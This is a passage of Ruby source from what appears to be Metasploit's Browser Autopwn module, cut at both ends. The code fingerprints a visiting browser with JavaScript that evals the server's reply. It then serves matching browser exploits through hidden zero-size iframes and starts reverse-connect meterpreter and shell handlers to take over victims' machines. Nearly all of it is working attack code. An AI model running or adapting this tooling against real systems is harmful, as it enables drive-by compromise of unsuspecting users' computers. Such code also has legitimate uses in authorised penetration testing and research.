     'DefaultAction'  => 'WebServer'))\n\n    register_options([\n      OptAddressLocal.new('LHOST', [true,\n        'The IP address to use for reverse-connect payloads'\n      ])\n    ])\n\n    register_advanced_options([\n      OptString.new('AutoRunScript', [false, \"A script to automatically on session creation.\", '']),\n      OptBool.new('AutoSystemInfo', [true, \"Automatically capture system information on initialization.\", true]),\n      OptRegexp.new('MATCH', [false,\n        'Only attempt to use exploits whose name matches this regex'\n      ]),\n      OptRegexp.new('EXCLUDE', [false,\n        'Only attempt to use exploits whose name DOES NOT match this regex'\n      ]),\n      OptBool.new('DEBUG_AUTOPWN', [false,\n        'Do not obfuscate the javascript and print various bits of useful info to the browser',\n        false\n      ]),\n      OptPort.new('LPORT_WIN32', [false,\n        'The port to use for Windows reverse-connect payloads', 3333\n      ]),\n      OptString.new('PAYLOAD_WIN32', [false,\n        'The payload to use for Windows reverse-connect payloads',\n        'windows/meterpreter/reverse_tcp'\n      ]),\n      OptPort.new('LPORT_LINUX', [false,\n        'The port to use for Linux reverse-connect payloads', 4444\n      ]),\n      OptString.new('PAYLOAD_LINUX', [false,\n        'The payload to use for Linux reverse-connect payloads',\n        'linux/meterpreter/reverse_tcp'\n      ]),\n      OptPort.new('LPORT_MACOS', [false,\n        'The port to use for Mac reverse-connect payloads', 5555\n      ]),\n      OptString.new('PAYLOAD_MACOS', [false,\n        'The payload to use for Mac reverse-connect payloads',\n        'osx/meterpreter/reverse_tcp'\n      ]),\n      OptPort.new('LPORT_GENERIC', [false,\n        'The port to use for generic reverse-connect payloads', 6666\n      ]),\n      OptString.new('PAYLOAD_GENERIC', [false,\n        'The payload to use for generic reverse-connect payloads',\n        'generic/shell_reverse_tcp'\n      ]),\n      OptPort.new('LPORT_JAVA', [false,\n        'The port to use for Java reverse-connect payloads', 7777\n      ]),\n      OptString.new('PAYLOAD_JAVA', [false,\n        'The payload to use for Java reverse-connect payloads',\n        'java/meterpreter/reverse_tcp'\n      ]),\n      OptPort.new('LPORT_ANDROID', [false,\n        'The port to use for Java reverse-connect payloads', 8888\n      ]),\n      OptString.new('PAYLOAD_ANDROID', [false,\n        'The payload to use for Android reverse-connect payloads',\n        'android/meterpreter/reverse_tcp'\n      ])\n    ])\n\n    @exploits = Hash.new\n    @payloads = Hash.new\n    @targetcache = Hash.new\n    @current_victim = Hash.new\n    @handler_job_ids = []\n  end\n\n\n  ##\n  # CommandDispatcher stuff\n  ##\n\n  def auxiliary_commands\n    {\n      'list' => \"%red#{self.refname}%clr: List the exploits as filtered by MATCH and EXCLUDE\"\n    }\n  end\n\n  def cmd_list(*args)\n    print_status(\"Listing Browser Autopwn exploits:\")\n    print_line\n    @exploits = {}\n    each_autopwn_module do |name, mod|\n      @exploits[name] = nil\n      print_line name\n    end\n    print_line\n    print_status(\"Found #{@exploits.length} exploit modules\")\n  end\n\n  ##\n  # Actual exploit stuff\n  ##\n\n  def run\n    if (action.name == 'list')\n      cmd_list\n    elsif (action.name == 'DefangedDetection')\n      # Do everything we'd normally do for exploits, but don't start any\n      # actual exploit modules\n      exploit()\n    else\n      start_exploit_modules()\n      if @exploits.length < 1\n        print_error(\"No exploits, check your MATCH and EXCLUDE settings\")\n        return false\n      end\n      exploit()\n    end\n  end\n\n\n  def setup\n    print_status(\"Setup\")\n\n    @init_js = ::Rex::Exploitation::Js::Detect.os(<<-ENDJS\n\n      #{js_base64}\n\n      function make_xhr() {\n        var xhr;\n        try {\n          xhr = new XMLHttpRequest();\n        } catch(e) {\n          try {\n            xhr = new ActiveXObject(\"Microsoft.XMLHTTP\");\n          } catch(e) {\n            xhr = new ActiveXObject(\"MSXML2.ServerXMLHTTP\");\n          }\n        }\n        if (! xhr) {\n          throw \"failed to create XMLHttpRequest\";\n        }\n        return xhr;\n      }\n\n      function report_and_get_exploits(detected_version) {\n        var encoded_detection;\n        xhr = make_xhr();\n        xhr.onreadystatechange = function () {\n          if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {\n            //var ta = document.createElement(\"textarea\");\n            //ta.rows = ta.cols = 100;\n            //ta.value = xhr.responseText;\n            //document.body.appendChild(ta)\n            eval(xhr.responseText);\n          }\n        };\n\n        encoded_detection = new String();\n        #{js_debug('navigator.userAgent+\"<br><br>\"')}\n        for (var prop in detected_version) {\n          #{js_debug('prop + \" \" + detected_version[prop] +\"<br>\"')}\n          encoded_detection += detected_version[prop] + \":\";\n        }\n        #{js_debug('\"<br>\"')}\n        encoded_detection = Base64.encode(encoded_detection);\n        xhr.open(\"GET\", document.location + \"?sessid=\" + encoded_detection);\n        xhr.send(null);\n      }\n\n      function bodyOnLoad() {\n        var detected_version = os_detect.getVersion();\n        //#{js_debug('detected_version')}\n        report_and_get_exploits(detected_version);\n      } // function bodyOnLoad\n    ENDJS\n    )\n\n    if (datastore['DEBUG_AUTOPWN'])\n      print_status(\"NOTE: Debug Mode; javascript will not be obfuscated\")\n    else\n      pre = Time.now\n\n      #\n      # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn\n      #\n\n      #print_status(\"Obfuscating initial javascript #{pre}\")\n      #@init_js.obfuscate\n      #print_status \"Done in #{Time.now - pre} seconds\"\n    end\n\n    #@init_js << \"window.onload = #{@init_js.sym(\"bodyOnLoad\")};\";\n    @init_html  = %Q|<html > <head > <title > Loading </title>\\n|\n    @init_html << %Q|<script language=\"javascript\" type=\"text/javascript\">|\n    @init_html << %Q|<!-- \\n #{@init_js} //-->|\n    @init_html << %Q|</script> </head> |\n    @init_html << %Q|<body onload=\"#{@init_js.sym(\"bodyOnLoad\")}()\"> |\n    @init_html << %Q|<div id=\"foo\"></div> |\n    @init_html << %Q|<noscript> \\n|\n    # Don't use build_iframe here because it will break detection in\n    # DefangedDetection mode when the target has js disabled.\n    @init_html << %Q|<iframe src=\"#{self.get_resource}?ns=1\"></iframe>|\n    @init_html << %Q|</noscript> \\n|\n    @init_html << %Q|</body> </html> |\n\n    #\n    # I'm still not sold that this is the best way to do this, but random\n    # LPORTs causes confusion when things break and breakage when firewalls\n    # are in the way.  I think the ideal solution is to have\n    # self-identifying payloads so we'd only need 1 LPORT for multiple\n    # stagers.\n    #\n    @win_lport  = datastore['LPORT_WIN32']\n    @win_payload  = datastore['PAYLOAD_WIN32']\n    @lin_lport  = datastore['LPORT_LINUX']\n    @lin_payload  = datastore['PAYLOAD_LINUX']\n    @osx_lport  = datastore['LPORT_MACOS']\n    @osx_payload  = datastore['PAYLOAD_MACOS']\n    @gen_lport  = datastore['LPORT_GENERIC']\n    @gen_payload  = datastore['PAYLOAD_GENERIC']\n    @java_lport = datastore['LPORT_JAVA']\n    @java_payload = datastore['PAYLOAD_JAVA']\n    @android_lport = datastore['LPORT_ANDROID']\n    @android_payload = datastore['PAYLOAD_ANDROID']\n\n    minrank = framework.datastore['MinimumRank'] || 'manual'\n    if not RankingName.values.include?(minrank)\n      print_error(\"MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join(\"|\")})\")\n      wlog(\"MinimumRank invalid, ignoring\", 'core', LEV_0)\n    end\n    @minrank = RankingName.invert[minrank]\n\n  end\n\n\n  def init_exploit(name, mod = nil, targ = 0)\n    if mod.nil?\n      @exploits[name] = framework.modules.create(name)\n    else\n      @exploits[name] = mod.new\n    end\n    @exploits[name] = framework.modules.reload_module(@exploits[name])\n\n    # Reloading failed\n    unless @exploits[name]\n      @exploits.delete(name)\n      return\n    end\n\n    apo = @exploits[name].class.autopwn_opts\n    if (apo[:rank] < @minrank)\n      @exploits.delete(name)\n      return false\n    end\n\n    case name\n    when %r{windows}\n      payload = @win_payload\n      lport = @win_lport\n=begin\n    #\n    # Some day, we'll support Linux and Mac OS X here..\n    #\n\n    when %r{linux}\n      payload = @lin_payload\n      lport = @lin_lport\n\n    when %r{osx}\n      payload = @osx_payload\n      lport = @osx_lport\n=end\n\n    # We need to check that it's /java_ instead of just java since it would\n    # clash with things like mozilla_navigatorjava.  Better would be to\n    # check the actual platform of the module here but i'm lazy.\n    when %r{/java_}\n      payload = @java_payload\n      lport = @java_lport\n    when %r{^android/}\n      payload = @android_payload\n      lport = @android_lport\n    else\n      payload = @gen_payload\n      lport = @gen_lport\n    end\n    @payloads[lport] = payload\n\n    print_status(\"Starting exploit #{name} with payload #{payload}\")\n    @exploits[name].datastore['SRVHOST'] = datastore['SRVHOST']\n    @exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']\n\n    # For testing, set the exploit uri to the name of the exploit so it's\n    # easy to tell what is happening from the browser.\n    if (datastore['DEBUG_AUTOPWN'])\n      @exploits[name].datastore['URIPATH'] = name\n    else\n      # randomize it manually since if a saved value exists in the user's\n      # configuration, the saved value will get used if we set it to nil\n      @exploits[name].datastore['URIPATH'] = Rex::Text.rand_text_alpha(rand(10) + 4)\n    end\n\n    @exploits[name].datastore['WORKSPACE'] = datastore[\"WORKSPACE\"] if datastore[\"WORKSPACE\"]\n    @exploits[name].datastore['MODULE_OWNER'] = self.owner\n    @exploits[name].datastore['ParentUUID'] = datastore[\"ParentUUID\"] if datastore[\"ParentUUID\"]\n    @exploits[name].datastore['AutopwnUUID'] = self.uuid\n    @exploits[name].datastore['LPORT'] = lport\n    @exploits[name].datastore['LHOST'] = @lhost\n    @exploits[name].datastore['SSL'] = datastore['SSL']\n    @exploits[name].datastore['SSLVersion'] = datastore['SSLVersion']\n    @exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'\n    @exploits[name].datastore['DisablePayloadHandler'] = true\n    @exploits[name].exploit_simple(\n      'LocalInput'     => self.user_input,\n      'LocalOutput'    => self.user_output,\n      'Target'         => targ,\n      'Payload'        => payload,\n      'RunAsJob'       => true)\n\n    # It takes a little time for the resources to get set up, so sleep for\n    # a bit to make sure the exploit is fully working.  Without this,\n    # mod.get_resource doesn't exist when we need it.\n    Rex::ThreadSafe.sleep(0.5)\n\n    # Make sure this exploit got set up correctly, return false if it\n    # didn't\n    if framework.jobs[@exploits[name].job_id.to_s].nil?\n      print_error(\"Failed to start exploit module #{name}\")\n      @exploits.delete(name)\n      return false\n    end\n\n    # Since r9714 or so, exploit_simple copies the module instead of\n    # operating on it directly when creating a job.  Put the new copy into\n    # our list of running exploits so we have access to its state.  This\n    # allows us to get the correct URI for each exploit in the same manor\n    # as before, using mod.get_resource().\n    @exploits[name] = framework.jobs[@exploits[name].job_id.to_s].ctx[0]\n\n    return true\n  end\n\n\n  def start_exploit_modules()\n    @lhost = (datastore['LHOST'] || \"0.0.0.0\")\n\n    @noscript_tests = {}\n    @all_tests = {}\n\n    print_line\n    print_status(\"Starting exploit modules on host #{@lhost}...\")\n    print_status(\"---\")\n    print_line\n    each_autopwn_module do |name, mod|\n      # Start the module.  If that fails for some reason, don't bother\n      # adding tests for it.\n      next if !(init_exploit(name))\n\n      apo = mod.autopwn_opts.dup\n      apo[:name] = name.dup\n      apo[:vuln_test] ||= \"\"\n\n      if apo[:classid]\n        # Then this is an IE exploit that uses an ActiveX control,\n        # build the appropriate tests for it.\n        apo[:vuln_test] = \"\"\n        apo[:ua_name] = HttpClients::IE\n        conditions = []\n        if apo[:classid].kind_of?(Array)  # then it's many classids\n          apo[:classid].each { |clsid|\n            if apo[:method].kind_of?(Array)  # then it's many methods\n              conditions += apo[:method].map { |m| \"testAXO('#{clsid}', '#{m}')\" }\n            else\n              conditions.push \"testAXO('#{clsid}', '#{method}')\"\n            end\n          }\n        end\n        apo[:vuln_test] << \"if (#{conditions.join(\"||\")}) {\\n\"\n        apo[:vuln_test] << \" is_vuln = true;\\n\"\n        apo[:vuln_test] << \"}\\n\"\n      end\n\n      # If the exploit supplies a min/max version, build up a test to\n      # check for the proper version.  Note: The version comparison\n      # functions come from javascriptosdetect.\n      js_d_ver = @init_js.sym(\"detected_version\")\n      if apo[:ua_minver] and apo[:ua_maxver]\n        ver_test =\n            \"!#{@init_js.sym(\"ua_ver_lt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}') && \" +\n            \"!#{@init_js.sym(\"ua_ver_gt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')\"\n      elsif apo[:ua_minver]\n        ver_test = \"!#{@init_js.sym(\"ua_ver_lt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}')\\n\"\n      elsif apo[:ua_maxver]\n        ver_test = \"!#{@init_js.sym(\"ua_ver_gt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')\\n\"\n      else\n        ver_test = nil\n      end\n\n      # if we built a version check above, add it to the normal test\n      if ver_test\n        test =  \"if (#{ver_test}) { \"\n        test << (apo[:vuln_test].empty? ? \"is_vuln = true;\" : apo[:vuln_test])\n        test << \"} else { is_vuln = false; }\\n\"\n        apo[:vuln_test] = test\n      end\n\n      # Now that we've got all of our exploit tests put together,\n      # organize them into an all tests (JS and no-JS), organized by rank,\n      # and doesnt-require-scripting (no-JS), organized by browser name.\n      if apo[:javascript] && apo[:ua_name]\n        @all_tests[apo[:rank]] ||= []\n        @all_tests[apo[:rank]].push(apo)\n      elsif apo[:javascript]\n        @all_tests[apo[:rank]] ||= []\n        @all_tests[apo[:rank]].push(apo)\n      elsif apo[:ua_name]\n        @noscript_tests[apo[:ua_name]] ||= []\n        @noscript_tests[apo[:ua_name]].push(apo)\n        @all_tests[apo[:rank]] ||= []\n        @all_tests[apo[:rank]].push(apo)\n      else\n        @noscript_tests[\"generic\"] ||= []\n        @noscript_tests[\"generic\"].push(apo)\n        @all_tests[apo[:rank]] ||= []\n        @all_tests[apo[:rank]].push(apo)\n      end\n    end\n\n    # start handlers for each type of payload\n    [@win_lport, @lin_lport, @osx_lport, @gen_lport, @java_lport].each do |lport|\n      if (lport and @payloads[lport])\n        print_status(\"Starting handler for #{@payloads[lport]} on port #{lport}\")\n        multihandler = framework.modules.create(\"exploit/multi/handler\")\n        multihandler.datastore['MODULE_OWNER'] = self.datastore['MODULE_OWNER']\n        multihandler.datastore['WORKSPACE'] = datastore[\"WORKSPACE\"] if datastore[\"WORKSPACE\"]\n        multihandler.datastore['ParentUUID'] = datastore[\"ParentUUID\"] if datastore[\"ParentUUID\"]\n        multihandler.datastore['CAMPAIGN_ID'] = datastore[\"CAMPAIGN_ID\"] if datastore[\"CAMPAIGN_ID\"]\n        multihandler.datastore['ParentModule'] = self.fullname\n        multihandler.datastore['AutopwnUUID'] = self.uuid\n        multihandler.datastore['LPORT'] = lport\n        multihandler.datastore['LHOST'] = @lhost\n        multihandler.datastore['ExitOnSession'] = false\n        multihandler.datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'\n        multihandler.datastore[\"ReverseListenerBindAddress\"] = datastore[\"ReverseListenerBindAddress\"]\n        # XXX: Revisit this when we have meterpreter working on more than just windows\n        if (lport == @win_lport or lport == @java_lport)\n          multihandler.datastore['AutoRunScript'] = datastore['AutoRunScript']\n          multihandler.datastore['AutoSystemInfo'] = datastore['AutoSystemInfo']\n          multihandler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript']\n        end\n        multihandler.exploit_simple(\n          'LocalInput'     => self.user_input,\n          'LocalOutput'    => self.user_output,\n          'Payload'        => @payloads[lport],\n          'RunAsJob'       => true)\n        @handler_job_ids.push(multihandler.job_id)\n      end\n    end\n    # let the handlers get set up\n    Rex::ThreadSafe.sleep(0.5)\n\n    print_line\n    print_status(\"--- Done, found %bld%grn#{@exploits.length}%clr exploit modules\")\n    print_line\n\n    # Sort the tests by reliability, descending.\n    # I don't like doing this directly (wihout a !), but any other sort wasn't sticking - NE\n    @all_tests = @all_tests.sort.reverse\n\n    # This matters a lot less for noscript exploits since they basically\n    # get thrown into a big pile of iframes that the browser will load\n    # semi-concurrently.  Still, might as well.\n    @noscript_tests.each { |browser,tests|\n      tests.sort! {|a,b| b[:rank] <=> a[:rank]}\n    }\n  end\n\n  #\n  # Main dispatcher method for when we get a request\n  #\n  def on_request_uri(cli, request)\n    print_status(\"Handling '#{request.uri}'\")\n\n    case request.uri\n    when self.get_resource\n      # This is the first request.  Send the javascript fingerprinter and\n      # hope it sends us back some data.  If it doesn't, javascript is\n      # disabled on the client and we will have to do a lot more\n      # guessing.\n      response = create_response()\n      response[\"Expires\"] = \"0\"\n      response[\"Cache-Control\"] = \"must-revalidate\"\n      response.body = @init_html\n      cli.send_response(response)\n    when %r{^#{self.get_resource}.*sessid=}\n      # This is the request for the exploit page when javascript is\n      # enabled.  Includes the results of the javascript fingerprinting\n      # in the \"sessid\" parameter as a base64 encoded string.\n      record_detection(cli, request)\n      if (action.name == \"DefangedDetection\")\n        response = create_response()\n        response.body = \"#{js_debug(\"'Please wait'\")}\"\n      else\n        response = build_script_response(cli, request)\n      end\n      response[\"Expires\"] = \"0\"\n      response[\"Cache-Control\"] = \"must-revalidate\"\n\n      cli.send_response(response)\n    when %r{^#{self.get_resource}.*ns=1}\n      # This is the request for the exploit page when javascript is NOT\n      # enabled.  Since scripting is disabled, fall back to useragent\n      # detection, which is kind of a bummer since it's so easy for the\n      # ua string to lie.  It probably doesn't matter that much because\n      # most of our exploits require javascript anyway.\n      print_status(\"Browser has javascript disabled, trying exploits that don't need it\")\n      record_detection(cli, request)\n      if (action.name == \"DefangedDetection\")\n        response = create_response()\n        response.body = \"Please wait\"\n      else\n        response = build_noscript_response(cli, request)\n      end\n\n      response[\"Expires\"] = \"0\"\n      response[\"Cache-Control\"] = \"must-revalidate\"\n      cli.send_response(response)\n    else\n      print_status(\"404ing #{request.uri}\")\n      send_not_found(cli)\n      return false\n    end\n  end\n\n  def html_for_exploit(autopwn_info, client_info)\n    html = \"\"\n\n    html << (autopwn_info[:prefix_html] || \"\") + \"\\n\"\n    html << build_iframe(exploit_resource(autopwn_info[:name])) + \"\\n\"\n    html << (autopwn_info[:postfix_html] || \"\") + \"\\n\"\n\n    if (HttpClients::IE == autopwn_info[:ua_name])\n      html = \"<!--[if IE]>\\n#{html}\\n<![endif]-->\\n\"\n    end\n\n    html\n  end\n\n  def build_noscript_html(cli, request)\n    client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])\n    body = \"\"\n\n    sploit_cnt = 0\n    @noscript_tests.each { |browser, sploits|\n      next if sploits.length == 0\n\n      next unless client_matches_browser(client_info, browser)\n\n      sploits.each do |s|\n        body << html_for_exploit( s, client_info )\n      end\n      sploit_cnt += 1\n    }\n    print_status(\"Responding with #{sploit_cnt} non-javascript exploits\")\n    body\n  end\n\n  def build_noscript_response(cli, request)\n\n    response = create_response()\n    response['Expires'] = '0'\n    response['Cache-Control'] = 'must-revalidate'\n\n    response.body  = \"<html > <head > <title > Loading </title> </head> \"\n    response.body << \"<body> \"\n    response.body << \"Please wait \"\n    response.body << build_noscript_html(cli, request)\n    response.body << \"</body> </html> \"\n\n    return response\n  end\n\n  #\n  # Build some javascript that attempts to determine which exploits to run\n  # for the victim's OS and browser.\n  #\n  # Returns a raw javascript string to be eval'd on the victim\n  #\n  def build_script_response(cli, request)\n    response = create_response()\n    response['Expires'] = '0'\n    response['Cache-Control'] = 'must-revalidate'\n\n    # Host info no longer comes from the database! This is strictly a value\n    # that came back from javascript OS detection because NAT basically\n    # makes it impossible to keep host/client mappings straight.\n    client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])\n    host_info   = client_info[:host]\n    #print_status(\"Client info: #{client_info.inspect}\")\n\n    js = \"var global_exploit_list = []\\n\";\n    # If we didn't get a client from the database, then the detection\n    # is borked or the db is not connected, so fallback to sending\n    # some IE-specific stuff with everything.  Do the same if the\n    # exploit didn't specify a client.  Otherwise, make sure this is\n    # IE before sending code for ActiveX checks.\n    if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))\n      # If we have a class name (e.g.: \"DirectAnimation.PathControl\"),\n      # use the simple and direct \"new ActiveXObject()\".  If we\n      # have a classid instead, first try creating the object\n      # with createElement(\"object\").  However, some things\n      # don't like being created this way (specifically winzip),\n      # so try writing out an object tag as well.  One of these\n      # two methods should succeed if the object with the given\n      # classid can be created.\n      js << <<-ENDJS\n        window.testAXO = function(axo_name, method) {\n          if (axo_name.substring(0,1) == String.fromCharCode(123)) {\n            axobj = document.createElement(\"object\");\n            axobj.setAttribute(\"classid\", \"clsid:\" + axo_name);\n            axobj.setAttribute(\"id\", axo_name);\n            axobj.setAttribute(\"style\", \"visibility: hidden\");\n            axobj.setAttribute(\"width\", \"0px\");\n            axobj.setAttribute(\"height\", \"0px\");\n            document.body.appendChild(axobj);\n            if (typeof(axobj[method]) == 'undefined') {\n              var attributes = 'id=\"' + axo_name + '\"';\n              attributes += ' classid=\"clsid:' + axo_name + '\"';\n              attributes += ' style=\"visibility: hidden\"';\n              attributes += ' width=\"0px\" height=\"0px\"';\n              document.body.innerHTML += \"<object \" + attributes + \"></object>\";\n              axobj = document.getElementById(axo_name);\n            }\n          } else {\n            try {\n              axobj = new ActiveXObject(axo_name);\n            } catch(e) {\n              // If we can't build it with an object tag and we can't build it\n              // with ActiveXObject, it can't be built.\n              return false;\n            };\n          }\n          #{js_debug('axo_name + \".\" + method + \" = \" + typeof axobj[method] + \"<br/>\"')}\n          if (typeof(axobj[method]) != 'undefined') {\n            return true;\n          }\n          return false;\n        };\n      ENDJS\n      # End of IE-specific test functions\n    end\n    # Generic stuff that is needed regardless of what browser was detected.\n    js << <<-ENDJS\n      var written_iframes = new Array();\n      window.write_iframe = function (myframe) {\n        var iframe_idx; var mybody;\n        for (iframe_idx in written_iframes) {\n          if (written_iframes[iframe_idx] == myframe) {\n            return;\n          }\n        }\n        written_iframes[written_iframes.length] = myframe;\n        str = '';\n        str += '<iframe src=\"' + myframe + '\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>';\n        document.body.innerHTML += (str);\n      };\n      window.next_exploit = function(exploit_idx) {\n        #{js_debug(\"'next_exploit(' + exploit_idx +')<br>'\")}\n        if (!global_exploit_list[exploit_idx]) {\n          #{js_debug(\"'End<br>'\")}\n          return;\n        }\n        #{js_debug(\"'trying ' + global_exploit_list[exploit_idx].resource + ' of ' + global_exploit_list.length + '<br>'\")}\n        // Wrap all of the vuln tests in a try-catch block so a\n        // single borked test doesn't prevent other exploits\n        // from working.\n        try {\n          var test = global_exploit_list[exploit_idx].test;\n          // Debugging\n          //tn = document.createTextNode(\"Test \" + exploit_idx +\"\\\\n\");\n          //br = document.createElement(\"br\");\n          //document.body.appendChild(tn);\n          //document.body.appendChild(br);\n          //tn = document.createTextNode(test);\n          //document.body.appendChild(tn);\n          if (!test) {\n            test = \"true\";\n          }\n\n          if (eval(test)) {\n            #{js_debug(\"'test says it is vuln, writing iframe for ' + global_exploit_list[exploit_idx].resource + '<br>'\")}\n            window.write_iframe(global_exploit_list[exploit_idx].resource);\n            setTimeout(\"window.next_exploit(\" + (exploit_idx+1).toString() + \")\", 1000);\n          } else {\n            #{js_debug(\"'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'\")}\n            window.next_exploit(exploit_idx+1);\n          }\n        } catch(e) {\n          #{js_debug(\"'test threw an exception: ' + e.message + '<br />'\")}\n          window.next_exploit(exploit_idx+1);\n        };\n      };\n    ENDJS\n\n    sploits_for_this_client = []\n    sploit_cnt = 0\n    # if we have no client_info, this will add all tests. Otherwise tries\n    # to only send tests for exploits that target the client's detected\n    # browser.\n\n    @all_tests.each { |rank, sploits|\n      sploits.each { |s|\n        browser = s[:ua_name] || \"generic\"\n        next unless client_matches_browser(client_info, browser)\n\n        # Send all the generics regardless of what the client is. If the\n        # client is nil, then we don't know what it really is, so just err\n        # on the side of shells and send everything. Otherwise, send only\n        # if the client is using the browser associated with this set of\n        # exploits.\n        if s[:javascript]\n          if (browser == \"generic\" || client_info.nil? || [nil, browser].include?(client_info[:ua_name]))\n            if s[:vuln_test].nil? or s[:vuln_test].empty?\n              test = \"is_vuln = true\"\n            else\n              # get rid of newlines and escape quotes\n              test = s[:vuln_test].gsub(\"\\n\",'').gsub(\"'\", \"\\\\\\\\'\")\n            end\n            # shouldn't be any in the resource, but just in case...\n            res = exploit_resource(s[:name]).gsub(\"\\n\",'').gsub(\"'\", \"\\\\\\\\'\")\n\n            # Skip exploits that don't match the client's OS.\n            if (host_info and host_info[:os_name] and s[:os_name])\n              # Reject exploits whose OS doesn't match that of the\n              # victim. Note that host_info comes from javascript OS\n              # detection, NOT the database.\n\n              # Note that the os_name could be a string, a regex, or\n              # an array of strings and regexes.\n\n              if host_info[:os_name] != \"undefined\"\n                unless client_matches_module_spec?(host_info[:os_name], s[:os_name])\n                  vprint_status(\"Rejecting #{s[:name]} for non-matching OS\")\n                  next\n                end\n              end\n            end\n\n            js << \"global_exploit_list[global_exploit_list.length] = {\\n\"\n            js << \"  'test':'#{test}',\\n\"\n            js << \"  'resource':'#{res}'\\n\"\n            js << \"};\\n\"\n            sploits_for_this_client.push s[:name]\n            sploit_cnt += 1\n          end\n        else\n          if s[:name] =~ %r|/java_|\n            res = exploit_resource(s[:name]).gsub(\"\\n\",'').gsub(\"'\", \"\\\\\\\\'\")\n            js << \"global_exploit_list[global_exploit_list.length] = {\\n\"\n            js << \"  'test':'is_vuln = navigator.javaEnabled()',\\n\"\n            js << \"  'resource':'#{res}'\\n\"\n            js << \"};\\n\"\n          else\n            # Some other kind of exploit that we can't generically\n            # check for in javascript, throw it on the pile.\n            noscript_html << html_for_exploit(s, client_info)\n          end\n          sploits_for_this_client.push s[:name]\n          sploit_cnt += 1\n        end\n      }\n    }\n\n    js << \"#{js_debug(\"'starting exploits (' + global_exploit_list.length + ' total)<br>'\")}\\n\"\n    js << \"window.next_exploit(0);\\n\"\n\n    #\n    # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn\n    #\n\n    #js = ::Rex::Exploitation::JSObfu.new(js)\n    #js.obfuscate unless datastore[\"DEBUG_AUTOPWN\"]\n\n    response.body = \"#{js}\"\n    print_status(\"Responding with #{sploit_cnt} exploits\")\n    sploits_for_this_client.each do |name|\n      vprint_status(\"* #{name}\")\n    end\n    return response\n  end\n\n\n  #\n  # Determines whether a browser string matches an exploit module specification\n  # Example: :os_name => ( 'Windows' | /Windows/ | ['Windows', 'Mac OS X'] )\n  #\n  def client_matches_module_spec?(client_str, module_spec)\n\n    case module_spec\n    when ::String\n      return !! (client_str == module_spec)\n    when ::Regexp\n      return !! client_str.match(module_spec)\n    when ::Array\n      return !! exploit_spec.map{ |spec|\n        client_matches_module_spec?(client_str, spec)\n      }.include?(true)\n    end\n\n    false\n  end\n\n  #\n  # Yields each module that exports autopwn_info, filtering on MATCH and EXCLUDE options\n  #\n  def each_autopwn_module(&block)\n    m_regex = datastore[\"MATCH\"]\n    e_regex = datastore[\"EXCLUDE\"]\n    framework.exploits.each_module do |name, mod|\n      if mod.respond_to?(\"autopwn_opts\") and\n         (m_regex.blank? or name =~ m_regex) and\n         (e_regex.blank? or name !~ e_regex)\n        yield name, mod\n      end\n    end\n  end\n\n  #\n  # Returns true if an exploit for +browser+ (one of the +OperatingSystems+\n  # constants) should be sent for a particilar client.  +client_info+ should\n  # be something returned by +get_client+.\n  #\n  # If +client_info+ is nil then get_client failed and we have no\n  # knowledge of this client, so we can't assume anything about their\n  # browser.  If the exploit does not specify a browser target, that\n  # means it it is generic and will work anywhere (or at least be\n  # able to autodetect).  If the currently connected client's ua_name\n  # is nil, then the fingerprinting didn't work for some reason.\n  # Lastly, check to see if the client's browser matches the browser\n  # targetted by this group of exploits. In all of these cases, we\n  # need to send all the exploits in the list.\n  #\n  # In contrast, if we have all of that info and it doesn't match, we\n  # don't need to bother sending it.\n  #\n  def client_matches_browser(client_info, browser)\n    if client_info and browser and client_info[:ua_name]\n      if browser != \"generic\" and  client_info[:ua_name] != browser\n        vprint_status(\"Rejecting exploits for #{browser}\")\n        return false\n      end\n    end\n\n    true\n  end\n\n\n  # consider abstracting this out to a method (probably\n  # with a different name) of Msf::Auxiliary::Report or\n  # Msf::Exploit::Remote::HttpServer\n  def record_detection(cli, request)\n    os_name = nil\n    os_flavor = nil\n    os_sp = nil\n    os_lang = nil\n    os_device = nil\n    os_vendor = nil\n    arch = nil\n    ua_name = nil\n    ua_ver = nil\n\n    data_offset = request.uri.index('sessid=')\n    #p request['User-Agent']\n    if (data_offset.nil? or -1 == data_offset)\n      # then we didn't get a report back from our javascript\n      # detection; make a best guess effort from information\n      # in the user agent string.  The OS detection should be\n      # roughly the same as the javascript version on non-IE\n      # browsers because it does most everything with\n      # navigator.userAgent\n      print_status(\"Recording detection from User-Agent: #{request['User-Agent']}\")\n      report_user_agent(cli.peerhost, request)\n    else\n      data_offset += 'sessid='.length\n      detected_version = request.uri[data_offset, request.uri.length]\n      if (0 < detected_version.length)\n        detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))\n        print_status(\"JavaScript Report: #{detected_version}\")\n\n        (os_name, os_vendor, os_flavor, os_device, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')\n\n        if framework.db.active\n          note_data = { }\n          note_data['os.product']   = os_name   if os_name != 'undefined'\n          note_data['os.vendor']    = os_vendor if os_vendor != 'undefined'\n          note_data['os.edition']   = os_flavor if os_flavor != 'undefined'\n          note_data['os.device']    = os_device if os_device != 'undefined'\n          note_data['os.version']   = os_sp     if os_sp != 'undefined'\n          note_data['os.language']  = os_lang   if os_lang != 'undefined'\n          note_data['os.arch']      = arch      if arch != 'undefined'\n          note_data['os.certainty'] = '0.7'\n          print_status(\"Reporting: #{note_data.inspect}\")\n\n          # Reporting stuff isn't really essential since we store all\n          # the target information locally.  Make sure any exception\n          # raised from the report_* methods doesn't prevent us from\n          # sending exploits.  This is really only an issue for\n          # connections from localhost where we end up with\n          # ActiveRecord::RecordInvalid errors because 